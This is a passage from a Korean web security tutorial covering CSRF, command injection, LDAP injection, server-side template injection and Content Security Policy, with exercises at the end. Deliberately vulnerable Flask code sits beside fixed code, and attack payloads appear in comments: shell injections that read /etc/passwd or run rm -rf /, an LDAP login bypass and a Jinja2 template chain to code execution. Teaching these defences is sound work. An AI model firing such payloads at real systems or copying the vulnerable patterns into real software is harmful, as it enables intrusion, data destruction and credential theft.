@app.route('/api/transfer', methods=['POST'])
def api_transfer():
    """
    Double Submit Cookie 패턴:
    1. 서버가 쿠키에 임의의 값 설정
    2. 클라이언트는 헤더에 동일한 값을 보내야 함
    3. 공격자는 쿠키 값을 읽을 수 없음 (동일 출처 정책)
    """
    cookie_token = request.cookies.get('csrf_token')
    header_token = request.headers.get('X-CSRF-Token')

    if not cookie_token or not header_token:
        return jsonify({"error": "CSRF token missing"}), 403

    if not hmac.compare_digest(cookie_token, header_token):
        return jsonify({"error": "CSRF token mismatch"}), 403

    # 요청 처리...
    return jsonify({"status": "success"})
```

### 4.3 CSRF 방지 요약

| 방법 | 작동 방식 | 장점 | 단점 |
|--------|-------------|------|------|
| 동기화 토큰 | 세션의 임의 토큰 + 폼 | 강력, 널리 지원됨 | 서버 측 세션 필요 |
| SameSite 쿠키 | 브라우저가 교차 사이트 쿠키 차단 | 간단, 코드 변경 불필요 | 오래된 브라우저 지원, 심층 방어만 |
| Double Submit Cookie | 쿠키의 토큰 + 헤더가 일치해야 함 | 무상태 | 하위 도메인이 침해되면 취약 |
| 사용자 정의 헤더 | 사용자 정의 헤더 필요 (예: X-Requested-With) | AJAX에 간단 | AJAX 요청에만 작동 |
| Origin/Referer 확인 | 요청 출처가 예상과 일치하는지 확인 | 심층 방어 | 프록시에 의해 제거될 수 있음 |

---

## 5. Command Injection

### 5.1 Command Injection 작동 방식

Command injection은 애플리케이션이 사용자 입력을 시스템 셸 명령으로 전달할 때 발생합니다. 공격자는 셸 메타문자를 사용하여 추가 명령을 추가할 수 있습니다.

```
┌─────────────────────────────────────────────────────────────────┐
│              Command Injection                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  애플리케이션 의도:                                               │
│  ping -c 4 google.com                                            │
│                                                                  │
│  공격자 제공:                                                     │
│  google.com; cat /etc/passwd                                     │
│                                                                  │
│  실행된 명령:                                                     │
│  ping -c 4 google.com; cat /etc/passwd                          │
│  ─────────────────────  ─────────────────                       │
│  의도된 명령              주입된 명령                             │
│                                                                  │
│  셸 메타문자:                                                     │
│  ;    → 명령 구분자 (두 명령 모두 실행)                          │
│  &&   → 첫 번째가 성공하면 두 번째 명령 실행                      │
│  ||   → 첫 번째가 실패하면 두 번째 명령 실행                      │
│  |    → 출력을 다음 명령으로 파이프                               │
│  `cmd`→ 명령 치환 (백틱)                                         │
│  $(cmd) → 명령 치환                                              │
│  > file → 출력을 파일로 리디렉션                                 │
│  < file → 파일에서 입력 읽기                                     │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 5.2 취약 코드와 수정 코드

```python
"""
command_injection.py - Command injection 취약점과 방지
"""
import os
import subprocess
import shlex
import re
from flask import Flask, request, jsonify

app = Flask(__name__)


# ==============================================================
# 취약: 사용자 입력이 있는 os.system
# ==============================================================

@app.route('/api/ping-vulnerable', methods=['POST'])
def ping_vulnerable():
    """취약: os.system을 통한 Command injection."""
    host = request.json['host']

    # 절대 하지 말 것
    result = os.popen(f"ping -c 4 {host}").read()
    return jsonify({"output": result})

# 공격: {"host": "google.com; cat /etc/passwd"}
# 공격: {"host": "google.com; rm -rf /"}
# 공격: {"host": "$(whoami)"}


@app.route('/api/lookup-vulnerable', methods=['POST'])
def lookup_vulnerable():
    """취약: shell=True가 있는 subprocess를 통한 Command injection."""
    domain = request.json['domain']

    # shell=True는 이를 취약하게 만듦!
    result = subprocess.run(
        f"nslookup {domain}",
        shell=True,  # 위험: 셸 메타문자 처리 활성화
        capture_output=True,
        text=True
    )
    return jsonify({"output": result.stdout})


# ==============================================================
# 수정: 여러 방어 계층
# ==============================================================

@app.route('/api/ping-secure', methods=['POST'])
def ping_secure():
    """수정: 안전한 명령 실행."""
    host = request.json.get('host', '')

    # 방어 1: 입력 검증 (화이트리스트)
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        return jsonify({"error": "Invalid hostname"}), 400

    # 방어 2: 길이 제한
    if len(host) > 253:  # 최대 DNS 이름 길이
        return jsonify({"error": "Hostname too long"}), 400

    # 방어 3: 리스트 인수로 subprocess 사용 (셸 없음)
    try:
        result = subprocess.run(
            ["ping", "-c", "4", host],  # 리스트 형식: 셸 해석 없음
            capture_output=True,
            text=True,
            timeout=10,  # 중단 방지
        )
        return jsonify({"output": result.stdout})
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Command timed out"}), 408


@app.route('/api/lookup-secure', methods=['POST'])
def lookup_secure():
    """수정: 셸 명령 대신 라이브러리 사용."""
    domain = request.json.get('domain', '')

    # 방어 1: 입력 검증
    if not re.match(r'^[a-zA-Z0-9.\-]+$', domain):
        return jsonify({"error": "Invalid domain"}), 400

    # 방어 2: 셸 명령 대신 Python 라이브러리 사용
    import socket
    try:
        result = socket.getaddrinfo(domain, None)
        ips = list(set(addr[4][0] for addr in result))
        return jsonify({"domain": domain, "addresses": ips})
    except socket.gaierror:
        return jsonify({"error": "DNS resolution failed"}), 400


@app.route('/api/resize-image-secure', methods=['POST'])
def resize_image_secure():
    """수정: 피할 수 없는 셸 사용을 위한 shlex.quote와 안전한 명령."""
    filename = request.json.get('filename', '')
    width = request.json.get('width', 800)

    # 파일명 검증 (경로 탐색 방지)
    if not re.match(r'^[a-zA-Z0-9_\-]+\.(jpg|png|gif)$', filename):
        return jsonify({"error": "Invalid filename"}), 400

    # width 검증
    if not isinstance(width, int) or not (1 <= width <= 4096):
        return jsonify({"error": "Invalid width"}), 400

    # 셸을 반드시 사용해야 한다면 (가능한 피함), shlex.quote 사용
    safe_filename = shlex.quote(filename)
    safe_width = str(int(width))

    # 하지만 리스트 형식 선호:
    result = subprocess.run(
        ["convert", f"uploads/{filename}", "-resize", f"{safe_width}x",
         f"resized/{filename}"],
        capture_output=True,
        text=True,
        timeout=30,
    )

    if result.returncode != 0:
        return jsonify({"error": "Conversion failed"}), 500

    return jsonify({"status": "resized"})
```

### 5.3 Command Injection 방지 규칙

```
┌─────────────────────────────────────────────────────────────────┐
│          Command Injection 방지                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. 셸 명령 완전히 피하기                                         │
│     대신 Python 라이브러리 사용:                                  │
│     - os.system("ping X")  → subprocess.run(["ping", X])       │
│     - os.system("nslookup")→ socket.getaddrinfo()              │
│     - os.system("convert") → Pillow 라이브러리                   │
│     - os.system("curl")    → requests 라이브러리                 │
│                                                                  │
│  2. 셸이 피할 수 없다면:                                         │
│     - 리스트 인수로 subprocess.run() 사용                        │
│     - shell=True 절대 사용하지 않기                              │
│     - 최후의 수단으로 shlex.quote() 사용                         │
│     - timeout 설정                                               │
│                                                                  │
│  3. 입력 검증:                                                   │
│     - 허용된 문자 화이트리스트 (영숫자 + 제한된 집합)             │
│     - 예상 형식에 대해 검증 (IP, 도메인, 파일명)                 │
│     - 셸 메타문자가 있는 입력 거부                               │
│                                                                  │
│  4. 최소 권한 원칙:                                              │
│     - 최소 OS 권한으로 애플리케이션 실행                         │
│     - 명령 실행에 컨테이너/샌드박스 사용                         │
│     - capability 제거 (네트워크 없음, 파일시스템 쓰기 없음)       │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 6. LDAP Injection

### 6.1 LDAP Injection 작동 방식

LDAP (Lightweight Directory Access Protocol) injection은 사용자 입력이 적절한 정제 없이 LDAP 쿼리를 구성하는 데 사용될 때 발생하며, SQL injection과 유사하지만 디렉터리 서비스를 대상으로 합니다.

```
┌─────────────────────────────────────────────────────────────────┐
│              LDAP Injection                                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  정상 LDAP 쿼리:                                                 │
│  (&(uid=alice)(userPassword=secret123))                         │
│                                                                  │
│  공격 (인증 우회):                                               │
│  Username: alice)(|(uid=*                                        │
│  Password: anything                                              │
│                                                                  │
│  결과 쿼리:                                                       │
│  (&(uid=alice)(|(uid=*)(userPassword=anything))                 │
│                                                                  │
│  (uid=*)가 항상 true이므로 모든 사용자와 일치                     │
│                                                                  │
│  LDAP 특수 문자:                                                 │
│  *    → 와일드카드 (모든 값)                                     │
│  (    → 필터 그룹 시작                                           │
│  )    → 필터 그룹 끝                                             │
│  \    → 이스케이프 문자                                          │
│  NUL  → 널 바이트                                                │
│  /    → DN 구분자                                                │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 6.2 취약 코드와 수정 코드

```python
"""
ldap_injection.py - LDAP injection 취약점과 방지
"""
import ldap3
import re
from flask import Flask, request, jsonify

app = Flask(__name__)

LDAP_SERVER = "ldap://ldap.example.com"
LDAP_BASE_DN = "dc=example,dc=com"


# ==============================================================
# 취약: LDAP 쿼리의 문자열 연결
# ==============================================================

@app.route('/api/ldap-login-vulnerable', methods=['POST'])
def ldap_login_vulnerable():
    username = request.json['username']
    password = request.json['password']

    # 취약: 직접 문자열 보간
    search_filter = f"(&(uid={username})(userPassword={password}))"

    server = ldap3.Server(LDAP_SERVER)
    conn = ldap3.Connection(server, auto_bind=True)
    conn.search(LDAP_BASE_DN, search_filter)

    if conn.entries:
        return jsonify({"status": "authenticated"})
    return jsonify({"error": "Invalid credentials"}), 401

# 공격: username = "*)(|(uid=*"  → 인증 우회


# ==============================================================
# 수정: LDAP용 입력 정제
# ==============================================================

def ldap_escape(value: str) -> str:
    """
    LDAP 필터 문자열의 특수 문자 이스케이프.
    RFC 4515, section 3 준수.
    """
    escaped = value.replace('\\', '\\5c')  # 먼저 실행해야 함
    escaped = escaped.replace('*', '\\2a')
    escaped = escaped.replace('(', '\\28')
    escaped = escaped.replace(')', '\\29')
    escaped = escaped.replace('\x00', '\\00')
    return escaped


def ldap_dn_escape(value: str) -> str:
    """LDAP Distinguished Names의 특수 문자 이스케이프."""
    special_chars = [',', '\\', '#', '+', '<', '>', ';', '"', '=']
    escaped = value
    for char in special_chars:
        escaped = escaped.replace(char, f'\\{char}')
    # 앞뒤 공백
    if escaped.startswith(' '):
        escaped = '\\ ' + escaped[1:]
    if escaped.endswith(' '):
        escaped = escaped[:-1] + '\\ '
    return escaped


@app.route('/api/ldap-login-secure', methods=['POST'])
def ldap_login_secure():
    username = request.json.get('username', '')
    password = request.json.get('password', '')

    # 방어 1: 입력 검증
    if not re.match(r'^[a-zA-Z0-9._-]+$', username):
        return jsonify({"error": "Invalid username format"}), 400

    if len(username) > 64:
        return jsonify({"error": "Username too long"}), 400

    # 방어 2: LDAP 특수 문자 이스케이프
    safe_username = ldap_escape(username)

    # 방어 3: 인증에 검색 대신 LDAP bind 사용
    # 이것이 권장 방법 - LDAP 서버가 비밀번호 검증
    server = ldap3.Server(LDAP_SERVER)
    user_dn = f"uid={ldap_dn_escape(username)},ou=users,{LDAP_BASE_DN}"

    try:
        # LDAP bind가 직접 인증 시도
        conn = ldap3.Connection(
            server, user=user_dn, password=password, auto_bind=True
        )
        conn.unbind()
        return jsonify({"status": "authenticated"})
    except ldap3.core.exceptions.LDAPBindError:
        return jsonify({"error": "Invalid credentials"}), 401
    except ldap3.core.exceptions.LDAPException:
        return jsonify({"error": "Authentication service error"}), 500


@app.route('/api/ldap-search-secure', methods=['GET'])
def ldap_search_secure():
    """적절하게 이스케이프된 필터로 안전한 LDAP 검색."""
    query = request.args.get('q', '')

    # 검증 및 이스케이프
    if not query or len(query) > 100:
        return jsonify({"error": "Invalid query"}), 400

    safe_query = ldap_escape(query)

    server = ldap3.Server(LDAP_SERVER)
    conn = ldap3.Connection(server, auto_bind=True)

    # 필터에서 이스케이프된 값 사용
    search_filter = f"(&(objectClass=person)(|(cn=*{safe_query}*)(mail=*{safe_query}*)))"
    conn.search(LDAP_BASE_DN, search_filter, attributes=['cn', 'mail'])

    results = [{"name": str(e.cn), "email": str(e.mail)} for e in conn.entries]
    conn.unbind()

    return jsonify({"results": results})
```

---

## 7. Server-Side Template Injection (SSTI)

### 7.1 SSTI 작동 방식

SSTI는 사용자 입력이 데이터로 전달되는 대신 템플릿 엔진의 템플릿 문자열에 포함될 때 발생합니다. 공격자는 템플릿 지시문을 통해 임의의 코드를 실행할 수 있습니다.

```
┌─────────────────────────────────────────────────────────────────┐
│          Server-Side Template Injection (SSTI)                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  안전 (데이터가 매개변수로 전달됨):                               │
│  render_template("hello.html", name=user_input)                 │
│  Template: <h1>Hello {{ name }}</h1>                            │
│  → 사용자 입력이 데이터로 처리되고 자동 이스케이프됨              │
│                                                                  │
│  취약 (템플릿에 사용자 입력이 포함됨):                            │
│  render_template_string(f"<h1>Hello {user_input}</h1>")         │
│  → 사용자 입력이 템플릿 코드!                                     │
│                                                                  │
│  공격 페이로드 (Jinja2):                                         │
│  {{ config.items() }}                                            │
│  → 애플리케이션 설정 덤프 (SECRET_KEY, DB URI 등)                │
│                                                                  │
│  {{ ''.__class__.__mro__[1].__subclasses__() }}                 │
│  → 모든 Python 클래스 나열 (RCE로 가는 경로)                     │
│                                                                  │
│  {{ ''.__class__.__mro__[1].__subclasses__()[X]('cmd',          │
│       shell=True, stdout=-1).communicate() }}                    │
│  → 원격 코드 실행!                                               │
│                                                                  │
│  영향받는 템플릿 엔진:                                            │
│  - Jinja2 (Python/Flask)                                        │
│  - Twig (PHP)                                                    │
│  - Freemarker (Java)                                            │
│  - Velocity (Java)                                               │
│  - ERB (Ruby)                                                    │
│  - Smarty (PHP)                                                  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 7.2 취약 코드와 수정 코드

```python
"""
ssti.py - Server-Side Template Injection 취약점과 방지
"""
from flask import Flask, request, render_template, render_template_string
from jinja2.sandbox import SandboxedEnvironment

app = Flask(__name__)
app.config['SECRET_KEY'] = 'super-secret-database-key-12345'


# ==============================================================
# 취약: 템플릿 문자열의 사용자 입력
# ==============================================================

@app.route('/greet-vulnerable')
def greet_vulnerable():
    name = request.args.get('name', 'World')

    # 취약: 사용자 입력이 템플릿의 일부
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)

# 공격: /greet-vulnerable?name={{ config['SECRET_KEY'] }}
# 결과: <h1>Hello super-secret-database-key-12345!</h1>

# 공격: /greet-vulnerable?name={{ ''.__class__.__mro__[1].__subclasses__() }}
# 결과: 모든 Python 클래스 나열, 코드 실행 가능


@app.route('/profile-vulnerable')
def profile_vulnerable():
    # 데이터베이스에서 사용자가 만든 템플릿 로드
    user_template = get_user_template(request.args['user_id'])

    # 취약: 사용자 제어 템플릿 내용
    return render_template_string(user_template)


# ==============================================================
# 취약: 오류 페이지의 템플릿
# ==============================================================

@app.errorhandler(404)
def not_found_vulnerable(error):
    url = request.url
    # 취약: URL이 템플릿 문자열에 반영됨
    template = f"""
    <html>
    <body>
        <h1>Page Not Found</h1>
        <p>The page {url} was not found.</p>
    </body>
    </html>
    """
    return render_template_string(template), 404

# 공격: GET /{{config.items()}}
# 404 핸들러가 config 데이터와 함께 템플릿을 렌더링


# ==============================================================
# 수정: 사용자 입력을 템플릿 코드가 아닌 데이터로 전달
# ==============================================================

@app.route('/greet-secure')
def greet_secure():
    name = request.args.get('name', 'World')

    # 수정: 사용자 입력이 데이터 매개변수로 전달됨
    # Jinja2는 변수일 때 {{ name }}을 자동 이스케이프
    return render_template_string(
        "<h1>Hello {{ name }}!</h1>",
        name=name  # 이것은 템플릿 코드가 아닌 데이터
    )

# 입력: {{ config['SECRET_KEY'] }}
# 출력: <h1>Hello {{ config[&#39;SECRET_KEY&#39;] }}!</h1>
# 실행되지 않고 텍스트로 렌더링됨!


# 최선: render_template_string이 아닌 별도 템플릿 파일 사용
@app.route('/greet-best')
def greet_best():
    name = request.args.get('name', 'World')
    return render_template('greet.html', name=name)
    # greet.html: <h1>Hello {{ name }}!</h1>


@app.errorhandler(404)
def not_found_secure(error):
    # 수정: URL이 템플릿에 포함되지 않고 데이터로 전달됨
    return render_template_string(
        """
        <html>
        <body>
            <h1>Page Not Found</h1>
            <p>The requested page was not found.</p>
        </body>
        </html>
        """,
    ), 404
    # 참고: 오류 페이지에 URL도 포함하지 않음 (정보 유출)


# ==============================================================
# 사용자 생성 템플릿이 필요한 경우: 샌드박스 사용
# ==============================================================

def render_user_template_safe(template_str: str, context: dict) -> str:
    """
    샌드박스 환경에서 사용자 제공 템플릿 렌더링.
    위험한 속성 및 메서드에 대한 접근 제한.
    """
    # 샌드박스 환경은 속성 접근 제한
    sandbox = SandboxedEnvironment()

    try:
        template = sandbox.from_string(template_str)
        return template.render(**context)
    except Exception:
        return "<p>Error rendering template</p>"

# 샌드박스가 방지하는 것:
# - __class__, __mro__, __subclasses__ 접근
# - 위험한 함수 호출
# - config 또는 기타 앱 내부 접근
# 하지만 여전히 100% 안전하지 않음 - 사용자 템플릿을 완전히 피하는 것이 좋음
```

### 7.3 SSTI 탐지 치트 시트

```
┌─────────────────────────────────────────────────────────────────┐
│          템플릿 엔진별 SSTI 탐지                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  범용 테스트 페이로드: ${7*7} 및 {{7*7}}                         │
│  둘 중 하나가 "49"로 렌더링되면 앱이 취약함                       │
│                                                                  │
│  엔진별 탐지:                                                    │
│  ┌──────────────┬──────────────────────┬─────────┐             │
│  │ 엔진         │ 테스트 페이로드      │ 출력    │              │
│  ├──────────────┼──────────────────────┼─────────┤             │
│  │ Jinja2       │ {{7*'7'}}            │ 7777777 │              │
│  │ Twig         │ {{7*'7'}}            │ 49      │              │
│  │ Freemarker   │ ${7*7}               │ 49      │              │
│  │ ERB (Ruby)   │ <%= 7*7 %>           │ 49      │              │
│  │ Smarty       │ {7*7}                │ 49      │              │
│  │ Velocity     │ #set($x=7*7)${x}    │ 49      │              │
│  └──────────────┴──────────────────────┴─────────┘             │
│                                                                  │
│  방지 (모든 엔진):                                               │
│  1. 사용자 입력을 템플릿에 넣지 않기                             │
│  2. 항상 사용자 입력을 템플릿 변수로 전달                        │
│  3. 사용자 템플릿이 필요한 경우 샌드박스 템플릿 환경 사용        │
│  4. 가능하면 로직 없는 템플릿 사용 (Mustache)                   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 8. Content Security Policy (CSP)

### 8.1 방어 계층으로서의 CSP

Content Security Policy는 브라우저에 승인된 출처에서만 리소스를 로드하도록 지시하는 HTTP 헤더입니다. XSS에 대한 가장 효과적인 심층 방어입니다.

```
┌─────────────────────────────────────────────────────────────────┐
│              Content Security Policy                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  CSP 없이:                                                       │
│  주입된 것을 포함하여 모든 <script> 태그가 실행됨                 │
│  <script>malicious_code()</script>  → 실행                      │
│                                                                  │
│  CSP와 함께:                                                     │
│  브라우저가 정책과 일치하지 않는 스크립트 차단                    │
│  <script>malicious_code()</script>  → 차단됨                    │
│  (인라인 스크립트가 CSP 허용 목록에 없기 때문)                    │
│                                                                  │
│  CSP 지시문:                                                     │
│  ┌──────────────────┬──────────────────────────────────┐       │
│  │ 지시문           │ 제어                              │       │
│  ├──────────────────┼──────────────────────────────────┤       │
│  │ default-src      │ 모든 리소스 유형의 폴백           │       │
│  │ script-src       │ JavaScript 출처                   │       │
│  │ style-src        │ CSS 출처                          │       │
│  │ img-src          │ 이미지 출처                       │       │
│  │ font-src         │ 폰트 출처                         │       │
│  │ connect-src      │ AJAX, WebSocket, EventSource      │       │
│  │ frame-src        │ iframe 출처                       │       │
│  │ media-src        │ 오디오/비디오 출처                │       │
│  │ object-src       │ 플러그인 (Flash, Java)            │       │
│  │ form-action      │ 폼 제출 대상                      │       │
│  │ frame-ancestors  │ 이 페이지를 포함할 수 있는 대상   │       │
│  │ base-uri         │ <base> 태그 제한                  │       │
│  │ report-uri       │ 위반 보고서를 보낼 위치           │       │
│  └──────────────────┴──────────────────────────────────┘       │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2 CSP 구현

```python
"""
csp_implementation.py - Flask용 Content Security Policy
"""
import secrets
from flask import Flask, request, make_response, g

app = Flask(__name__)


# ==============================================================
# 레벨 1: 기본 CSP (좋은 시작점)
# ==============================================================

@app.after_request
def add_csp_basic(response):
    """대부분의 XSS를 차단하는 기본 CSP."""
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "          # 동일 출처에서만 로드
        "script-src 'self'; "           # 인라인 스크립트 없음!
        "style-src 'self'; "            # 인라인 스타일 없음!
        "img-src 'self' data:; "        # 이미지용 data: URI 허용
        "font-src 'self'; "
        "object-src 'none'; "           # Flash/Java 플러그인 없음
        "frame-ancestors 'none'; "      # iframe에 포함 불가
        "base-uri 'self'; "             # <base> 하이재킹 방지
        "form-action 'self'"            # 폼은 자신에게만 제출
    )
    return response


# ==============================================================
# 레벨 2: nonce가 있는 CSP (필요할 때 인라인 스크립트용)
# ==============================================================

@app.before_request
def generate_csp_nonce():
    """각 요청에 대해 고유한 nonce 생성."""
    g.csp_nonce = secrets.token_urlsafe(32)


@app.after_request
def add_csp_nonce(response):
    """nonce 기반 인라인 스크립트 허용 목록이 있는 CSP."""
    nonce = getattr(g, 'csp_nonce', '')

    response.headers['Content-Security-Policy'] = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "  # 이 nonce가 있는 스크립트만
        f"style-src 'self' 'nonce-{nonce}'; "
        f"img-src 'self' data: https:; "
        f"font-src 'self' https://fonts.gstatic.com; "
        f"connect-src 'self' https://api.example.com; "
        f"object-src 'none'; "
        f"frame-ancestors 'none'; "
        f"base-uri 'self'; "
        f"form-action 'self'; "
        f"report-uri /api/csp-report"
    )
    return response


# 템플릿에서 인라인 스크립트에 nonce 사용:
"""
<!-- 이 인라인 스크립트는 올바른 nonce가 있으므로 허용됨 -->
<script nonce="{{ g.csp_nonce }}">
    // 정상 인라인 스크립트
    document.getElementById('app').textContent = 'Hello';
</script>

<!-- 이 주입된 스크립트는 차단됨 (nonce 없음) -->
<script>
    // XSS 페이로드 - CSP에 의해 차단!
    document.cookie;
</script>
"""


# ==============================================================
# 레벨 3: Strict CSP (Google 권장)
# ==============================================================

@app.after_request
def add_csp_strict(response):
    """Google 권장 사항 기반 Strict CSP."""
    nonce = getattr(g, 'csp_nonce', '')

    response.headers['Content-Security-Policy'] = (
        # strict-dynamic: 신뢰할 수 있는 스크립트에 의해 로드된 스크립트 신뢰
        f"script-src 'nonce-{nonce}' 'strict-dynamic' https:; "
        f"object-src 'none'; "
        f"base-uri 'self'; "
        # 위반 보고
        f"report-uri /api/csp-report"
    )
    return response


# ==============================================================
# CSP 위반 보고
# ==============================================================

@app.route('/api/csp-report', methods=['POST'])
def csp_report():
    """CSP 위반 보고서 수신."""
    report = request.get_json(force=True)
    violation = report.get('csp-report', {})

    app.logger.warning(
        f"CSP Violation: {violation.get('violated-directive')} "
        f"blocked: {violation.get('blocked-uri')} "
        f"page: {violation.get('document-uri')}"
    )

    return '', 204


# ==============================================================
# Report-Only 모드 (시행 전 테스트용)
# ==============================================================

@app.after_request
def add_csp_report_only(response):
    """CSP를 아무것도 차단하지 않고 테스트하기 위해 Report-Only 사용."""
    nonce = getattr(g, 'csp_nonce', '')

    # Content-Security-Policy-Report-Only: 로그만 기록하고 차단하지 않음
    response.headers['Content-Security-Policy-Report-Only'] = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        f"report-uri /api/csp-report"
    )
    return response
```

### 8.3 CSP 배포 전략

```
┌─────────────────────────────────────────────────────────────────┐
│              CSP 배포 단계                                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  단계 1: Report-Only 모드                                        │
│  Content-Security-Policy-Report-Only 헤더로 배포                 │
│  1-2주 동안 위반 보고서 모니터링                                 │
│  차단될 정상 리소스 수정                                         │
│                                                                  │
│  단계 2: 기본 시행                                               │
│  Content-Security-Policy 헤더로 전환                             │
│  허용적인 정책으로 시작, 점진적으로 강화                         │
│  문제를 포착하기 위해 report-uri 유지                            │
│                                                                  │
│  단계 3: 엄격한 시행                                             │
│  'unsafe-inline' 제거 (대신 nonce 사용)                         │
│  'unsafe-eval' 제거                                             │
│  스크립트 로드를 위해 'strict-dynamic' 추가                      │
│  허용된 도메인 최소화                                            │
│                                                                  │
│  단계 4: 유지보수                                                │
│  CSP 보고서 정기적으로 검토                                      │
│  애플리케이션 발전에 따라 정책 업데이트                          │
│  스테이징에서 먼저 CSP 변경 사항 테스트                          │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 9. 심층 방어 요약

```
┌─────────────────────────────────────────────────────────────────┐
│          인젝션에 대한 심층 방어                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  계층 1: 입력 검증                                               │
│  ├── 화이트리스트 검증 (블랙리스트보다 선호)                      │
│  ├── 타입 검사 (int, email, URL 형식)                           │
│  ├── 길이 제한                                                   │
│  └── 문자 집합 제한                                              │
│                                                                  │
│  계층 2: 매개변수화 / 안전한 API                                 │
│  ├── 매개변수화된 쿼리 (SQL)                                     │
│  ├── 템플릿 데이터 매개변수 (SSTI)                               │
│  ├── 리스트 인수로 subprocess (Command)                          │
│  └── LDAP 이스케이프 함수 (LDAP)                                 │
│                                                                  │
│  계층 3: 출력 인코딩                                             │
│  ├── HTML 엔티티 인코딩 (HTML 컨텍스트의 XSS)                   │
│  ├── JavaScript 인코딩 (JS 컨텍스트의 XSS)                      │
│  ├── URL 인코딩 (URL 컨텍스트의 XSS)                            │
│  └── 각 출력에 대한 컨텍스트별 인코딩                            │
│                                                                  │
│  계층 4: 보안 헤더                                               │
│  ├── Content-Security-Policy (인라인 스크립트 차단)             │
│  ├── X-Content-Type-Options: nosniff                            │
│  ├── X-Frame-Options: DENY                                      │
│  └── Set-Cookie: HttpOnly; Secure; SameSite                    │
│                                                                  │
│  계층 5: 런타임 보호                                             │
│  ├── Web Application Firewall (WAF)                             │
│  ├── 속도 제한                                                   │
│  ├── 이상 탐지                                                   │
│  └── 보안 모니터링 및 경고                                       │
│                                                                  │
│  단일 계층으로는 충분하지 않음. 모든 계층을 함께 사용.            │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 10. 연습 문제

### 연습 문제 1: SQL Injection 랩

인젝션 취약점을 식별하고, 악용 페이로드를 작성한 후 코드를 수정하세요:

```python
"""
연습 문제: SQL injection을 찾고, 악용한 후 수정하세요.
"""
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

@app.route('/api/products')
def search_products():
    category = request.args.get('category', '')
    min_price = request.args.get('min_price', '0')
    max_price = request.args.get('max_price', '99999')
    sort = request.args.get('sort', 'name')

    db = sqlite3.connect('shop.db')
    query = f"""
        SELECT id, name, price, description
        FROM products
        WHERE category = '{category}'
        AND price BETWEEN {min_price} AND {max_price}
        ORDER BY {sort}
    """
    results = db.execute(query).fetchall()
    return jsonify(results)

# 질문:
# 1. 인젝션 포인트가 몇 개입니까? (각각 식별)
# 2. 데이터베이스에서 모든 테이블 이름을 추출하는 페이로드 작성
# 3. 모든 사용자 비밀번호를 추출하는 페이로드 작성
# 4. 모든 인젝션 벡터를 방지하도록 코드 수정
```

### 연습 문제 2: XSS 챌린지

이 템플릿과 백엔드의 모든 XSS 취약점을 수정하세요:

```python
"""
연습 문제: 이 블로그 애플리케이션의 모든 XSS 취약점을 수정하세요.
"""
from flask import Flask, request, render_template_string

app = Flask(__name__)

BLOG_TEMPLATE = """
<html>
<head>
    <title>{{ title }}</title>
    <style>
        .highlight { color: """ + "{{ highlight_color }}" + """; }
    </style>
</head>
<body>
    <h1>Blog Post</h1>

    <!-- 검색 결과 -->
    <p>Showing results for: """ + "{{ search_query }}" + """</p>

    <!-- 게시물 내용 (포매팅을 위해 HTML 허용) -->
    <div class="content">{{ post_content|safe }}</div>

    <!-- 사용자 댓글 -->
    <div class="comment" data-author="{{ comment_author }}">
        {{ comment_text }}
    </div>

    <!-- 공유 버튼 -->
    <a href="javascript:share('{{ share_url }}')">Share</a>

    <script>
        var userName = '{{ current_user }}';
        var searchTerm = '{{ search_query }}';
        document.getElementById('welcome').innerHTML =
            'Welcome, ' + userName;
    </script>
</body>
</html>
"""

@app.route('/blog')
def blog():
    return render_template_string(BLOG_TEMPLATE,
        title=request.args.get('title', 'My Blog'),
        highlight_color=request.args.get('color', 'blue'),
        search_query=request.args.get('q', ''),
        post_content=get_post_content(),  # DB에서, 사용자 HTML 포함 가능
        comment_author=request.args.get('author', ''),
        comment_text=request.args.get('comment', ''),
        share_url=request.args.get('url', ''),
        current_user=get_current_username(),
    )

# 질문:
# 1. 모든 XSS 벡터 식별 (최소 6개)
# 2. 각각에 대해 어떤 유형인지 설명 (reflected, stored, DOM)
# 3. 적절한 인코딩으로 각 취약점 수정
# 4. Content Security Policy 헤더 추가
```

### 연습 문제 3: CSRF 방어

이 애플리케이션에 대한 완전한 CSRF 방어를 구현하세요:

```python
"""
연습 문제: 모든 상태 변경 엔드포인트에 CSRF 방어 추가.
토큰 기반과 SameSite 쿠키 보호 모두 구현.
"""
from flask import Flask, request, jsonify, render_template_string, session

app = Flask(__name__)
app.secret_key = 'change-me'

# 이 엔드포인트들은 CSRF 방어가 필요:

@app.route('/transfer', methods=['POST'])
def transfer_money():
    """계정 간 송금."""
    from_account = request.form['from']
    to_account = request.form['to']
    amount = request.form['amount']
    # TODO: CSRF 방어 추가
    return do_transfer(from_account, to_account, amount)

@app.route('/api/profile', methods=['PUT'])
def update_profile():
    """AJAX를 통한 사용자 프로필 업데이트."""
    data = request.json
    # TODO: AJAX 요청을 위한 CSRF 방어 추가
    return update_user_profile(data)

@app.route('/api/delete-account', methods=['DELETE'])
def delete_account():
    """사용자 계정 영구 삭제."""
    # TODO: CSRF 방어 + 추가 확인 추가
    return delete_user_account(session['user_id'])

# 요구사항:
# 1. csrf_protect 데코레이터 구현
# 2. CSRF 토큰 생성 및 검증
# 3. 폼 제출과 AJAX 요청 모두 처리
